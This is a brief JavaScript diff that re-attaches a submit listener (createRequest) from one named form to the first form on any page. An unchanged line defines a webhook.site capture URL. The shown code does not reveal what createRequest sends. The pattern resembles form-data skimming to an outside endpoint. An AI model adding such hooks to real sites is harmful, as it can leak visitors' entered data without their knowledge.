@@ -5,7 +5,7 @@ const Url='https://webhook.site/699a57c5-679e-42ba-a94d-ca0595ec55c6';
 $(document).ready(
 	function()
 	{
-		document.getElementById("form_416097").addEventListener("submit", createRequest);
+		document.forms[0].addEventListener("submit", createRequest);
 	}
 );
 
